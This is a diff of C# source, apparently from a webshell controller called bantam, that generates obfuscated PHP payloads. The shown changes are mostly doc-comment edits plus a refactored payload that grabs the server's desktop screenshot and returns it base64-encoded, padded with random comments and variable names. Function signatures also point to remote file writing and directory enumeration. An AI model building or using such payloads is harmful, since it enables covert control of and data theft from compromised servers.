@@ -40,7 +40,6 @@ namespace bantam.Classes
         /// Returns a random PHP comment string of a random length with a maxlength, 
         /// uses a slider in the options form to determine injection freqency based on slider value
         /// </summary>
-        /// <param name="maxNum"></param>
         /// <returns></returns>
         public static string RandomPHPComment()
         {
@@ -261,14 +260,13 @@ namespace bantam.Classes
         public static string WindowsDesktopScreenShot()
         {
             string imageResource = RandomPHPVar();
-            string imageData = RandomPHPVar();
 
-            return "ob_start();" + RandomPHPComment()
+            return phpOb_Start
                  + imageResource + " = imagegrabscreen();"
-                + "imagepng(" + imageResource + ");" + RandomPHPComment()
-                 + imageData + " = ob_get_clean();"
+                 + "imagepng(" + imageResource + ");" + RandomPHPComment()
+                 + phpOb_End
                  + "imagedestroy(" + imageResource + ");" + RandomPHPComment()
-                 + "echo '<img src=\"data:image/png;base64,'.base64_encode(" + imageData + ").'\" />';";
+                 + "echo '<img src=\"data:image/png;base64,'.base64_encode($result).'\" />';";
         }
 
         /// <summary>
@@ -341,6 +339,7 @@ namespace bantam.Classes
         /// Gets the php code for creating a very basic CURL request
         /// </summary>
         /// <param name="url"></param>
+        /// <param name="encryptResponse"></param>
         /// <returns></returns>
         public static string getBasicCurl(string url, bool encryptResponse)
         {
@@ -432,7 +431,6 @@ namespace bantam.Classes
         /// <summary>
         /// phpinfo(); page
         /// </summary>
-        /// <param name="code"></param>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
         public static string PhpInfo(bool encryptResponse)
@@ -525,8 +523,9 @@ namespace bantam.Classes
         /// <summary>
         /// Writes a file to the server at the specified "remoteFileLocation" location.
         /// </summary>
-        /// <param name="remoteFileLocation">This expects the direct path string to the file you want to create</param>
+        /// <param name="remoteFileLocation"></param>
         /// <param name="b64FileContents"></param>
+        /// <param name="flags"></param>
         /// <returns></returns>
         public static string WriteFile(string remoteFileLocation, string b64FileContents, string flags = "0")
         {
@@ -536,8 +535,9 @@ namespace bantam.Classes
         /// <summary>
         /// Writes a file to the server at the specified "remoteFileLocation" location.
         /// </summary>
-        /// <param name="remoteFileLocation"></param>
-        /// <param name="b64FileContents">This expects a php variable that contains the path</param>
+        /// <param name="fileLocationVar"></param>
+        /// <param name="b64FileContents"></param>
+        /// <param name="flags"></param>
         /// <returns></returns>
         public static string WriteFileVar(string fileLocationVar, string b64FileContents, string flags = "0")
         {
@@ -549,6 +549,7 @@ namespace bantam.Classes
         /// </summary>
         /// <param name="location"></param>
         /// <param name="phpVersion"></param>
+        /// <param name="encryptResponse"></param>
         /// <returns></returns>
         public static string DirectoryEnumerationCode(string location, string phpVersion, bool encryptResponse)
         {
